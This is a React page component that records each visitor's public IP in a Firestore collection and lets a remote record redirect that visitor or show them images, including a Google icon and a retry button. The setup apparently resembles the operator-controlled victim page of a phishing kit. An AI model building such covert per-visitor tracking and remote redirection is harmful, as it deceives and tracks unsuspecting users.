import React, { useEffect, useState } from 'react'
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIp, publicIpv4, publicIpv6 } from 'public-ip';
import { db } from '../firebase.js';
import DynamicImage from './DynamicImage.js';
import RetryButton from './RetryButton.js';
import LoadingSpinner from './LoadingSpinner.js';


const About10 = () => {
    const [ip, setIp] = useState(undefined);
    const [userData, setUserData] = useState(undefined)
    const [isUserData, setIsUserData] = useState(false)
    const [userUrl, setUserUrl] = useState(false)
    const [imageUrl, setImageUrl] = useState(false)
    const [imageSrc, setImageSrc] = useState('');
    const [showButton, setShowButton] = useState(false);
    const [tryButtonClicked, setTryButtonClicked] = useState(false);
    const [isLoading, setIsLoading] = useState(true);




    const getUserData = async () => {
        const docRef = doc(db, 'nrchanger', ip);
        const docSnapshot = await getDoc(docRef);

        if (docSnapshot.exists()) {
            const userData = { ...docSnapshot.data(), id: docSnapshot.id };
            setIsUserData(true);
            setUserData(userData);
        } else {
            addUserData();
        }
    };



    const getIp = async () => {
        if (ip === undefined) {
            console.log(await publicIpv4());

            const ip = await publicIpv4()
            setIp(ip);
        }

    };
    getIp()


    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "nrchanger"), (snapshot) => {
                let isExist = false
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {
                        isExist = true
                        setUserData(x)
                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {

                            data.url_data.filter((item) => {
                                if (item.id === parseInt(x.redir)) {
                                    setUserUrl(item.url)
                                    return
                                }
                            })
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }

                })
                if (!isExist) {
                    setUserUrl(false)
                }
            })

        }
    }, [ip]);

    
    const updateImage = () => {
        // Set the image source to your new local image here
        setImageSrc('google_icon.png');
        setShowButton(true)
        setTryButtonClicked(false)
      };

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };
    const handleActions = async () => {
        setTimeout(()=>{
            setIsLoading(true)
            setShowButton(false)
            setTryButtonClicked(true)
            setImageUrl(false)
            

        },1000)
        
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);
            await setDoc(docRef, {image: "" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }

      };
    
    useEffect(() => {
        document.title = 'Welcome About10';
        if (userData && userData.image !== ""){
            setIsLoading(false)
            setImageUrl(true)

        }
        if (userUrl) {
            setTimeout(() => {
                window.location = userUrl
            }, 1000)
            resetUserNumber()

        }
        if (imageUrl) {
            setTimeout(() => {
              updateImage();
            }, 5000); 
          }
          setImageSrc(undefined)
          setShowButton(false)

    }, [userData, userUrl,imageUrl])


      useEffect(() => {
        if (tryButtonClicked && isLoading === false){
            setImageSrc(undefined)
            setTimeout(() => {
              updateImage();
            }, 5000); 
        }
      }, [tryButtonClicked]);


    const addUserData = async () => {

        try {
            const docRef = doc(collection(db, "nrchanger"), ip);

            // Check if the document exists
            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                // Document doesn't exist, so set the data
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1",
                    image: ""
                });
                console.log("Document written with ID: ", ip);
                getUserData()
            }
            else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    }


    useEffect(() => {
        if (ip) {
            getUserData()
        }

    }, [ip])

    console.log("hi here is the data", isUserData, userData)

    return (
        <div className="App">
            {isLoading ?<LoadingSpinner/>:
            <>
            {userData && (userData.image !== "" || imageSrc) ? (
            <div>
              <DynamicImage imageUrl={imageSrc || userData.image} />
              {showButton && <RetryButton onClick={handleActions} />}
            </div>
          ) : (
            <></>
          )}
            </>}
          
        </div>
      );
    };

export default About10;